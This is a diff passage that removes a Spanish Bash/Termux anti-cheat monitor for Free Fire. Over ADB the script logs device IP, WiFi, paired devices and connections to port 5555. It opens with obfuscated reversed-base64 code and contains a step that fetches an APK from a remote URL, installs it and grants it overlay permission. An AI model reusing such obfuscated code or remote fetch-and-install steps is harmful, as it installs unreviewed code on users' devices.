RUQgMVRO9USYVkTPNkIgIHZo91YlNHIgACIKsHIpgiYzV3XiRWYft2Ylh2YfJnY'
-
-_d '=0nCiICI0VHc0V3bfd2bsBCIgAiCi0nT7RychN3boNWZwN3bzBCUDRFIzVmbvlGel52bjBibpNFIdNJnivVfHtHJiACd1BHd192Xn9GbgYiJg0FIwAScl1CIE5UVPZEJgsFIgACIKkmZgACIgoQamBCIgACIgACIKETPE5UVPZEIgACIgACIgACIgAiCpkyM9sCVOV1TD91UV9USDlEUTV1UogCImYCIgACIgAiIOFETiASctACclJ3ZgwHIiMlTO90QfVEVP1URSRiIg8GajVGIgACIgACIgACIgAiCpkSN9sCVOV1TD91UV9USDlEUTV1UogCImYCIiQVROJVRU5USiASctACclJ3ZgwHIiMlTO90QfVEVP1URSRiIg8GajVGIgACIgACIgACIgAiCl52bkBCIgACIgACIgACIgogI950ekwGJgASfZtHJiACd1BHd192Xn9GbgwHfgACIgACIgACIgACIgACIgACIgAiCcBiI950ekwGJgASfStHJiACd1BHd192Xn9GbgYiJgACIgACIgACIgACIgACIgACIgAiCcBiIUVkTSVEVOlkIgEXLgAXZydGI8BiIsRiI' 'g8GajVGIgACIgACIgACIgACIgACIK8GZgsDbgIXLgQWYlJHIlxWaodHI8BiIT5kTPN0XFR1TNVkUkICIvh2YlBCIgACIgACIgACIgogI950ekozch5mclRHelBycQlEIhBCRFh0UJxkQBR1UFBCUDRFIzVmbvlGel52bDBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgACIgACIK4WZoRHI70FIiMlTO90QfVEVP1URSRiIg4WLgsFImlGIgACIgACIgoQK1ETLgQWYlhGI8BSdtACdy92cgwHIsxWdu9idlR2L+IDInACIgACIgACIK0HIgACIgACIgACIgAiC9BCIgACIgACIgACIgACIgAiC0J3bwBCLwlGIs8GcpRHIsIibcRWJgozb0JXZ1BFIgMHOx0SJgoDUJBCIzVCIgICImRnbpJHcgACIgACIgACIgACIgACIgACIgAiCiQVROJVRU5USiASPg8GcpRHIgACIgACIgACIgACIgACIgACIgACIgAiClNHblBCIgACIgACIgACIgACIgACIgACIKIiTBxkIg0DIvBXa0BCIgACIgACIgACIgACIgACIgACI' 'gACIgoQKpgjNx0TPyQGImYCIykTM90TMkhCI8xHIpEzM9wjMkBiJmAiNx0jPyQGImYCIycTM90TMkhCI8xHIwETP9EDZoAiZpBCIgACIgACIgACIgACIgACIgACIKsHIpQjMwEDI+ACdy9GcgYiJgADI9ECIxQGImYCI3ITMg0TIgEDZoAiZpBCIgACIgACIgACIgACIgAiCp0lMbJHIigHMigSb152b0JHdzBSPgQncvBHIgACIgACIgACIgACIgACIKQDZi4iIzQmIuIiMkJiLiEDZg0DIwlGIgACIgACIgACIgACIgACIKkSKywyNsgXZohic0NnY1NHIigHMigSb152b0JHdzBSPgEDZgACIgACIgACIgACIgACIgoQKpIDL1wCelhGKyR3ciV3cgICewICKtVnbvRnc0NHI9AiMkBCIgACIgACIgACIgACIgAiCpkiMsMDL4VGaoIHdzJWdzBiI4BjIo0Wdu9GdyR3cg0DIzQGIgACIgACIgACIgACIgACIKkSKywSMsgXZohic0NnY1NHIigHMigSb152b0JHdzBSPgQDZgACIgACIgACIgACIgACIgoQXxslc' 'g0DI4VGagACIgACIgACIgACIgACIgoQKiojIgwicgwyMkgCdpxGczBCIgACIgACIgACIgACIgAiC7BiIxAjIg0TPgQDJgACIgACIgACIgACIKcCIrdXYgwHIicVQS9FUDRFJiAyboNWZoQSPT5kTPN0XFR1TNVkUgACIgACIgAiCT5kTPN0XFR1TNVkUgwWYj9GbgACIgACIgAiCuVGa0ByOdBiIXFkUfB1QURiIg4WLgsFImlGIgACIKkCMwITLgQWYlhGI8BCbsVnbvYXZk9iPyAiIUhFVfJlQkICIgACIgACIgoAXgcSf0lGelt3L9Zzet41LgYiJgQmb19mZg0Hdulmcwt3L6sSX50CMbpSXdpTZjFGczpzWb51LgYiJgQmb19mZg0Hd4VmbgsTM9Qmb19mZ79CcjR3LcRXZu9CXj9mcw9CXvcCIrdXYoQSPXFkUfB1QUBCIgAiCXFkUfB1QUBCbhN2bsBCIgAiCw0DROV1TGBCbhN2bsBCIgAiCiUEVP1URSBClAKOIQNEVgMVRO9USYVkTPNkIgIHZo91YlNHIgACIKsHIpgSZ09WblJ3XwNGdft2Ylh2YfJnY'
-
-_d '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'
-
-
-
-
-
-adb_reconectar() {
-    [ -z "$_ADB_PORT" ] && return 1
-    adb connect localhost:$_ADB_PORT >/dev/null 2>&1
-    sleep 1
-    adb get-state 2>/dev/null | grep -q "device"
-}
-
-adb_check_reconnect() {
-    if ! adb get-state 2>/dev/null | grep -q "device"; then
-        echo -e "${Y}[!] Dispositivo desconectado. Reconectando...${N}"
-        if adb_reconectar; then
-            echo -e "${G}[✓] Reconectado.${N}"
-            return 0
-        else
-            echo -e "${R}[!] No se pudo reconectar.${N}"
-            return 1
-        fi
-    fi
-    return 0
-}
-
-detectar_conexiones_adb() {
-    # Obtener lista de dispositivos conectados via adb wireless al dispositivo
-    local _out
-    _out=$(adb shell "ss -tnp 2>/dev/null | grep ':5555\|LISTEN\|adb'" 2>/dev/null | tr -d '
-')
-
-    # Conexiones TCP al puerto ADB del dispositivo
-    local _conns
-    _conns=$(adb shell "ss -tn 2>/dev/null | grep ':5555'" 2>/dev/null | tr -d '
-')
-
-    # Obtener IP propia del dispositivo
-    local _self_ip
-    _self_ip=$(adb shell "ip route get 1.1.1.1 2>/dev/null | grep -o 'src [0-9.]*' | awk '{print \$2}'" 2>/dev/null | tr -d '
-')
-
-    echo "$_conns" | while IFS= read -r line; do
-        [ -z "$line" ] && continue
-        # Extraer IP remota
-        local _remote_ip
-        _remote_ip=$(echo "$line" | awk '{print $5}' | cut -d: -f1)
-        [ -z "$_remote_ip" ] || [ "$_remote_ip" = "0.0.0.0" ] && continue
-        # Verificar si es localhost (Termux) o externo
-        if echo "$_remote_ip" | grep -qE "^127\.|^::1$"; then
-            echo "TERMUX|$_remote_ip"
-        else
-            echo "EXTERNO|$_remote_ip"
-        fi
-    done
-}
-
-ver_conexiones_adb() {
-    clear; banner
-    echo_hdr "CONEXIONES A DEPURACIÓN INALÁMBRICA" "$R"
-    echo ""
-    adb_check_reconnect || { echo -e "${W}Enter para volver...${N}"; read; main_menu; return; }
-    echo -e "${C}[*] Analizando conexiones activas al puerto ADB...${N}"
-    echo ""
-    local _self_ip
-    _self_ip=$(adb shell "ip route get 1.1.1.1 2>/dev/null | grep -o 'src [0-9.]*' | awk '{print \$2}'" 2>/dev/null | tr -d '
-')
-    echo -e "${W}IP del dispositivo: ${G}${_self_ip:-desconocida}${N}"
-    echo ""
-    local _conns
-    _conns=$(adb shell "ss -tn 2>/dev/null | grep ':5555'" 2>/dev/null | tr -d '
-')
-    if [ -z "$_conns" ]; then
-        echo -e "${G}[✓] Sin conexiones externas al puerto ADB.${N}"
-    else
-        echo -e "${Y}Conexiones activas al puerto 5555 (ADB):${N}"
-        echo ""
-        local _sospechosa=0
-        while IFS= read -r line; do
-            [ -z "$line" ] && continue
-            local _remote
-            _remote=$(echo "$line" | awk '{print $5}')
-            local _state
-            _state=$(echo "$line" | awk '{print $1}')
-            if echo "$_remote" | grep -qE "^127\.|^::1"; then
-                echo -e "  ${G}[OK]${W} Localhost (Termux): $_remote${N}"
-            else
-                echo -e "  ${R}[⚠ SOSPECHOSO]${W} IP externa: $_remote${N}"
-                _sospechosa=1
-            fi
-        done <<< "$_conns"
-        echo ""
-        if [ "$_sospechosa" = "1" ]; then
-            echo -e "${R}[!] ALERTA: Hay conexiones externas a la depuración inalámbrica.${N}"
-            echo -e "${R}    Posible proxy/cheat activo mediante ADB wireless.${N}"
-        fi
-    fi
-    echo ""
-    echo -e "${W}Enter para actualizar / Q + Enter para volver: ${N}"
-    read -r _inp
-    [ "${_inp^^}" = "Q" ] && main_menu || ver_conexiones_adb
-}
-abrir_juego_menu() {
-    if ! adb get-state 2>/dev/null | grep -q "device"; then
-        clear; banner
-        echo_hdr "MONITOR EN VIVO — FUCKING CHEATS" "$M"
-        echo ""
-        echo -e "${R}[!] No hay dispositivos conectados. Usá la opción [0]${N}"
-        echo -e "${W}Enter para volver...${N}"; read; main_menu; return
-    fi
-    while true; do
-        clear; banner
-        echo_hdr "MONITOR EN VIVO — UNKNOWN MONITOR" "$M"
-        echo ""
-        echo -e "${G}[1]${W} Free Fire Normal${N}"
-        echo -e "${G}[2]${W} Free Fire MAX${N}"
-        echo -e "${R}[V]${W} Volver${N}"
-        echo ""
-        echo -ne "${Y}Selecciona: ${N}"
-        read -r _ajg_opc
-        case "${_ajg_opc^^}" in
-            1) _ajg_pkg="com.dts.freefireth";  _ajg_nombre="Free Fire Normal"; break ;;
-            2) _ajg_pkg="com.dts.freefiremax"; _ajg_nombre="Free Fire MAX";    break ;;
-            V) main_menu; return ;;
-            *) echo -e "${R}Opción inválida${N}"; sleep 1 ;;
-        esac
-    done
-    # Instalar APK del monitor si no está instalada
-    echo -e "${C}[*] Verificando Unknown Monitor...${N}"
-    if ! adb shell pm list packages 2>/dev/null | grep -q "com.unknown.monitor"; then
-        echo -e "${Y}[*] Descargando Unknown Monitor...${N}"
-        _apk_url="https://raw.githubusercontent.com/Streakxit/TiziXit-AntiCheat/main/unknown-monitor.apk"
-        _apk_dst="/data/local/tmp/unknown-monitor.apk"
-        echo -e "${Y}[*] Descargando APK via Termux...${N}"
-        _apk_tmp="$HOME/unknown-monitor.apk"
-        curl -L -o "$_apk_tmp" "$_apk_url" 2>/dev/null || wget -O "$_apk_tmp" "$_apk_url" 2>/dev/null
-        if [ ! -s "$_apk_tmp" ]; then
-            echo -e "${R}[!] No se pudo descargar el APK.${N}"
-            echo -e "${W}    Verificá tu conexión a internet.${N}"
-            echo -e "${W}Enter para volver...${N}"; read; main_menu; return
-        fi
-        adb push "$_apk_tmp" "$_apk_dst" >/dev/null 2>&1
-        rm -f "$_apk_tmp"
-        echo -e "${Y}[*] Instalando Unknown Monitor...${N}"
-        _inst_out=$(adb shell pm install -r "$_apk_dst" 2>&1 | tr -d '
-')
-        if echo "$_inst_out" | grep -qi "success"; then
-            echo -e "${G}[✓] Unknown Monitor instalado correctamente.${N}"
-        else
-            echo -e "${R}[!] Error al instalar: $_inst_out${N}"
-            echo -e "${W}Enter para volver...${N}"; read; main_menu; return
-        fi
-                sleep 2
-    fi
-    # Dar permiso overlay via ADB
-    echo -e "${C}[*] Otorgando permiso overlay...${N}"
-    adb shell appops set com.unknown.monitor SYSTEM_ALERT_WINDOW allow 2>/dev/null
-    # Abrir el juego
-    echo -e "${C}[*] Abriendo $_ajg_nombre...${N}"
-    adb shell monkey -p "$_ajg_pkg" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
-    sleep 2
-    # Lanzar monitor overlay
-    echo -e "${C}[*] Lanzando Unknown Monitor...${N}"
-    adb shell am start -n com.unknown.monitor/.MainActivity 2>/dev/null
-    sleep 1
-    echo -e "${G}[✓] Todo listo.${N}"
-    echo -e "${W}Presioná Q + Enter para detener.${N}"
-    echo ""
-    _mon_stop="$HOME/.mon_stop"
-    rm -f "$_mon_stop"
-    _mon_inicio=$(date +%s)
-    # Writer en background con output visible
-    (
-        _ciclo=0
-        while [ ! -f "$_mon_stop" ]; do
-            _ciclo=$(( _ciclo + 1 ))
-            _ahora=$(date +%s)
-            _elapsed=$(( _ahora - _mon_inicio ))
-            printf -v _t "%02d:%02d:%02d" $(( _elapsed/3600 )) $(( (_elapsed%3600)/60 )) $(( _elapsed%60 ))
-            echo -e "${C}[MON #$_ciclo]${W} Recolectando datos...${N}" >&2
-            _ip=$(adb shell ip route get 1.1.1.1 2>/dev/null | grep -o 'src [0-9.]*' | awk '{print $2}' | tr -d '
-')
-            echo -e "  IP: ${_ip:-VACIO}" >&2
-            _wifi=$(adb shell dumpsys wifi 2>/dev/null | grep -o 'SSID: [^,]*' | head -1 | tr -d '
-')
-            echo -e "  WiFi: ${_wifi:-VACIO}" >&2
-            if [ -n "$_prev_ip" ] && [ "${_ip:-desconocida}" != "$_prev_ip" ]; then
-                echo -e "  [!] CAMBIO DE IP: $_prev_ip -> $_ip" >&2
-                printf "%s [IP] Cambio: %s -> %s
-" "$(date '+%H:%M:%S')" "$_prev_ip" "${_ip:-desconocida}" >> "$HOME/unknown_logs.txt"
-                adb shell "cat > /data/local/tmp/unknown_logs.txt" < "$HOME/unknown_logs.txt" 2>/dev/null
-            fi
-            _prev_ip="${_ip:-desconocida}"
-            if [ -n "$_prev_wifi" ] && [ "${_wifi:-desconocida}" != "$_prev_wifi" ]; then
-                echo -e "  [!] CAMBIO DE WIFI: $_prev_wifi -> $_wifi" >&2
-                printf "%s [WiFi] Cambio: %s -> %s
-" "$(date '+%H:%M:%S')" "$_prev_wifi" "${_wifi:-desconocida}" >> "$HOME/unknown_logs.txt"
-                adb shell "cat > /data/local/tmp/unknown_logs.txt" < "$HOME/unknown_logs.txt" 2>/dev/null
-            fi
-            _prev_wifi="${_wifi:-desconocida}"
-                        _pid=$(adb shell "pidof $_ajg_pkg 2>/dev/null" 2>/dev/null | tr -d '
-')
-            echo -e "  PID: ${_pid:-VACIO}" >&2
-            _conns=""
-            [ -n "$_pid" ] && _conns=$(adb shell "cat /proc/$_pid/net/tcp6 2>/dev/null | awk 'NR>1{print \$3}' | head -6" 2>/dev/null | tr -d '
-')
-            # Detección de dispositivos vinculados a depuración inalámbrica
-            _adb_prev="${_adb_prev:-}"
-
-            # Obtener dispositivos conectados actualmente via adb devices
-            _devs_now=$(adb devices 2>/dev/null | grep -v "List of" | grep "device$" | awk '{print $1}' | tr '\n' ' ' | tr -d '\r\000')
-
-            # Obtener nombres de dispositivos vinculados — extraer solo el nombre al final de cada entrada
-            _paired=$(adb shell "dumpsys adb 2>/dev/null" 2>/dev/null | tr -d '\000\r' | grep -oE '[a-zA-Z0-9_@.-]+@localhost|shizuku|brevent|[a-zA-Z0-9_-]{4,}@[a-zA-Z0-9.-]+' | grep -v "^QAAA\|^key\|^ABX\|^wifi\|^bssid\|^version\|^adb\|^last" | sort -u | tr '\n' ' ')
-
-            # Conexiones TCP activas al puerto del servicio ADB wireless
-            _tcp_conns=$(adb shell "ss -tnp 2>/dev/null | grep ESTAB" 2>/dev/null | tr -d '\r\000' | grep -v "^$" | awk '{print $4"->"$5}' | tr '\n' ' ')
-
-            _adb_clients="CONECTADOS: ${_devs_now:-ninguno} | VINCULADOS: ${_paired:-sin datos} | TCP: ${_tcp_conns:-ninguno}"
-
-            # Detectar cambios en dispositivos vinculados entre ciclos
-            _adb_cambio=""
-            echo -e "  PREV: '${_adb_prev_paired:-vacio}'" >&2
-            echo -e "  NOW:  '$_paired'" >&2
-            if [ -n "$_adb_prev_paired" ] && [ "$_paired" != "$_adb_prev_paired" ]; then
-                echo -e "  [CAMBIO DETECTADO]" >&2
-                _eliminados=""
-                _agregados=""
-                for _d in $_adb_prev_paired; do
-                    echo "$_paired" | grep -qw "$_d" || _eliminados="$_eliminados$_d "
-                done
-                for _d in $_paired; do
-                    echo "$_adb_prev_paired" | grep -qw "$_d" || _agregados="$_agregados$_d "
-                done
-                echo -e "  ELIMINADOS: '$_eliminados'" >&2
-                echo -e "  AGREGADOS: '$_agregados'" >&2
-                if [ -n "$_eliminados" ]; then
-                    _adb_cambio="[!] DESVINCULADO: $_eliminados"
-                    printf "$(date '+%H:%M:%S') [ADB] DESVINCULADO: $_eliminados\n" >> "$HOME/unknown_logs.txt"
-                    echo -e "${R}  [!] ADB DESVINCULADO: $_eliminados${N}" >&2
-                fi
-                if [ -n "$_agregados" ]; then
-                    _adb_cambio="$_adb_cambio [!] NUEVO: $_agregados"
-                    printf "$(date '+%H:%M:%S') [ADB] NUEVO VINCULADO: $_agregados\n" >> "$HOME/unknown_logs.txt"
-                    echo -e "${Y}  [!] ADB NUEVO: $_agregados${N}" >&2
-                fi
-                # Subir logs actualizados al dispositivo inmediatamente
-                adb shell "cat > /data/local/tmp/unknown_logs.txt" < "$HOME/unknown_logs.txt" 2>/dev/null
-            fi
-            _adb_prev_paired="$_paired"
-
-            echo -e "  ADB now: $_devs_now" >&2
-            echo -e "  ADB paired: $_paired" >&2
-
-            _contenido=$(printf "Juego     : %s\nTiempo    : %s\nIP        : %s\nRed WiFi  : %s\nPID       : %s\n%s\n\nDisp conectados:\n%s\n\nDisp vinculados:\n%s\n\nConexiones TCP:\n%s"                 "$_ajg_nombre" "$_t" "${_ip:-desconocida}" "${_wifi:-desconocida}" "${_pid:-no encontrado}"                 "${_adb_cambio}" "${_devs_now:-ninguno}" "${_paired:-sin datos}" "${_conns:-ninguna}")
-            echo -e "  Escribiendo en dispositivo..." >&2
-            _push_out=$(echo "$_contenido" | adb shell "cat > /data/local/tmp/unknown_monitor.txt" 2>&1)
-            echo -e "  Push result: ${_push_out:-OK}" >&2
-                        sleep 4
-        done
-    ) &
-    _mon_pid=$!
-    while true; do
-        read -r _key
-        [ "${_key^^}" = "Q" ] && break
-    done
-    touch "$_mon_stop"
-    sleep 1
-    kill "$_mon_pid" 2>/dev/null
-    adb shell am force-stop com.unknown.monitor 2>/dev/null
-    rm -f "$_mon_stop"
-    main_menu
-}
-
-unknown_monitor_writer() {
-    local _pkg="$1"
-    local _nombre="$2"
-    local _inicio
-    _inicio=$(date +%s)
-    local _ultima_ip=""
-    local _ultima_wifi=""
-    local _sospechas=0
-    local _logs=""
-    local _garena="103.98\|45.121\|45.122\|203.90\|103.246\|104.16\|172.64\|162.159"
-
-    while true; do
-        local _ahora
-        _ahora=$(date +%s)
-        local _elapsed=$(( _ahora - _inicio ))
-        printf -v _tiempo "%02d:%02d:%02d" $(( _elapsed/3600 )) $(( (_elapsed%3600)/60 )) $(( _elapsed%60 ))
-
-        local _ip
-        # Reconectar si ADB se cayó
-        if ! adb get-state 2>/dev/null | grep -q "device"; then
-            adb_reconectar >/dev/null 2>&1
-            sleep 2
-        fi
-        _ip=$(adb shell "ip route get 1.1.1.1 2>/dev/null | grep -o 'src [0-9.]*' | awk '{print \$2}'" 2>/dev/null | tr -d '\r')
-        local _wifi
-        _wifi=$(adb shell "dumpsys wifi 2>/dev/null | grep -o 'SSID: [^,]*' | head -1" 2>/dev/null | tr -d '\r')
-        [ -z "$_wifi" ] && _wifi="desconocida"
-        local _pid
-        _pid=$(adb shell "pidof $_pkg 2>/dev/null" | tr -d '\r')
-
-        # Detectar cambios
-        if [ -n "$_ultima_ip" ] && [ "$_ip" != "$_ultima_ip" ]; then
-            _sospechas=$(( _sospechas + 1 ))
-            _logs="$(date '+%H:%M:%S') [SOSPECHOSO] Cambio IP: $_ultima_ip -> $_ip\n$_logs"
-        fi
-        if [ -n "$_ultima_wifi" ] && [ "$_wifi" != "$_ultima_wifi" ] && [ "$_ultima_wifi" != "desconocida" ]; then
-            _sospechas=$(( _sospechas + 1 ))
-            _logs="$(date '+%H:%M:%S') [SOSPECHOSO] Cambio red: $_ultima_wifi -> $_wifi\n$_logs"
-        fi
-        _ultima_ip="$_ip"
-        _ultima_wifi="$_wifi"
-
-        # Conexiones del proceso
-        local _conns=""
-        if [ -n "$_pid" ]; then
-            _conns=$(adb shell "cat /proc/$_pid/net/tcp6 2>/dev/null | awk 'NR>1{print \$3}' | head -8" 2>/dev/null | tr -d '\r')
-        fi
-
-        # Detectar conexiones externas al puerto ADB
-        _adb_ext=""
-        _adb_raw=$(adb shell "ss -tn 2>/dev/null | grep ':5555'" 2>/dev/null | tr -d '\r')
-        if [ -n "$_adb_raw" ]; then
-            while IFS= read -r _al; do
-                [ -z "$_al" ] && continue
-                _ar=$(echo "$_al" | awk '{print $5}')
-                if ! echo "$_ar" | grep -qE "^127\\.|^::1"; then
-                    _adb_ext="${_adb_ext}$_ar "
-                    _sospechas=$(( _sospechas + 1 ))
-                    _logs="$(date '+%H:%M:%S') [ADB EXTERNO] $_ar\n$_logs"
-                fi
-            done <<< "$_adb_raw"
-        fi
-        [ -z "$_adb_ext" ] && _adb_ext="ninguna"
-        # Escribir archivo monitor
-        printf "Juego     : %s\nTiempo    : %s\nIP        : %s\nRed WiFi  : %s\nPID       : %s\nSospechas : %s\nADB ext   : %s\n\nConexiones:\n%s"             "$_nombre" "$_tiempo" "${_ip:-desconocida}" "$_wifi" "${_pid:-no encontrado}" "$_sospechas" "$_adb_ext" "${_conns:-ninguna}"             > "$HOME/unknown_monitor.txt"
-        adb push "$HOME/unknown_monitor.txt" /sdcard/unknown_monitor.txt >/dev/null 2>&1
-
-        # Escribir logs
-        printf "%b" "$_logs" > "$HOME/unknown_logs.txt"
-        adb push "$HOME/unknown_logs.txt" /sdcard/unknown_logs.txt >/dev/null 2>&1
-
-        sleep 5
-    done
-}
-
-unknown_monitor() {
-    local _pkg="$1"
-    local _nombre="$2"
-    local _inicio
-    _inicio=$(date +%s)
-    local _logs=()
-    local _sospechas=0
-    local _ultima_ip=""
-    local _ultima_wifi=""
-    # IPs legítimas de Garena/FF (rangos conocidos)
-    local _garena_ranges="103.98\|45.121\|45.122\|203.90\|103.246\|104.16\|172.64\|162.159"
-
-    # Función interna para obtener datos del dispositivo
-    _mon_collect() {
-        # PID del juego
-        _mon_pid=$(adb shell "pidof $_pkg 2>/dev/null | tr -d '\r'" 2>/dev/null | tr -d '\r')
-        # IP actual del dispositivo
-        _mon_ip=$(adb shell "ip route get 1.1.1.1 2>/dev/null | grep -o 'src [0-9.]*' | awk '{print \$2}'" 2>/dev/null | tr -d '\r')
-        # SSID WiFi
-        _mon_wifi=$(adb shell "dumpsys wifi 2>/dev/null | grep 'mWifiInfo' | grep -o 'SSID: [^,]*' | head -1" 2>/dev/null | tr -d '\r')
-        [ -z "$_mon_wifi" ] && _mon_wifi=$(adb shell "dumpsys netstats 2>/dev/null | grep -o 'iface=wlan[^ ]*' | head -1" 2>/dev/null | tr -d '\r')
-        [ -z "$_mon_wifi" ] && _mon_wifi="desconocido"
-        # Conexiones TCP del proceso
-        if [ -n "$_mon_pid" ]; then
-            _mon_conns=$(adb shell "cat /proc/$_mon_pid/net/tcp6 2>/dev/null | awk 'NR>1 {print \$3}' | while read h; do
-                p1=\$(echo \$h | cut -c1-8)
-                p2=\$(echo \$h | cut -c9-16)
-                p3=\$(echo \$h | cut -c17-24)
-                p4=\$(echo \$h | cut -c25-32)
-                port=\$(echo \$h | cut -c34-37)
-                printf '%d.%d.%d.%d:%d\n' \
-                  \$((16#\${p4:6:2}))\$((16#\${p4:4:2}))\$((16#\${p4:2:2}))\$((16#\${p4:0:2})) \
-                  \$((16#\${port}))
-            done 2>/dev/null | grep -v '^0\.' | head -10" 2>/dev/null | tr -d '\r')
-        else
-            _mon_conns=""
-        fi
-    }
-
-    while true; do
-        _mon_collect
-        local _ahora
-        _ahora=$(date +%s)
-        local _elapsed=$(( _ahora - _inicio ))
-        local _hh=$(( _elapsed / 3600 ))
-        local _mm=$(( (_elapsed % 3600) / 60 ))
-        local _ss=$(( _elapsed % 60 ))
-        local _tiempo
-        printf -v _tiempo "%02d:%02d:%02d" $_hh $_mm $_ss
-
-        # Detectar cambios sospechosos
-        if [ -n "$_ultima_ip" ] && [ "$_mon_ip" != "$_ultima_ip" ]; then
-            _sospechas=$(( _sospechas + 1 ))
-            _logs+=("$(date '+%H:%M:%S') [⚠ SOSPECHOSO] Cambio de IP: $_ultima_ip → $_mon_ip")
-        fi
-        if [ -n "$_ultima_wifi" ] && [ "$_mon_wifi" != "$_ultima_wifi" ] && [ "$_ultima_wifi" != "desconocido" ]; then
-            _sospechas=$(( _sospechas + 1 ))
-            _logs+=("$(date '+%H:%M:%S') [⚠ SOSPECHOSO] Cambio de red: $_ultima_wifi → $_mon_wifi")
-        fi
-        # Detectar IPs no-Garena en conexiones del proceso
-        if [ -n "$_mon_conns" ]; then
-            while IFS= read -r _conn; do
-                local _conn_ip
-                _conn_ip=$(echo "$_conn" | cut -d: -f1)
